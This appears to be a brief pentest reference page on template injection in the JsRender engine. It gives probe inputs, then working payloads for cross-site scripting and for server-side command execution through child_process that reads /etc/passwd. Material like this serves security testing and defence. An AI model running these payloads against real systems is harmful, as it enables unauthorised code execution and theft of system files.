# JsRender Template Injection

JsRender is a light-weight but powerful template engine. It is vulnerable to template injection.

### Investigation <a href="#investigation" id="investigation"></a>

Try to insert arbitrary code into double curly brackets. If the result of the code is reflected in the page, we can inject malicious code in the template.

```
{{:2*3}}
{{:"test".toString}}
```

### Exploitation <a href="#exploitation" id="exploitation"></a>

```
# XSS
{{:"test".toString.constructor.call({},"alert(1)")}}
# Read local files
{{:"test".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```

### References <a href="#references" id="references"></a>

* [AppCheck](https://appcheck-ng.com/template-injection-jsrender-jsviews)
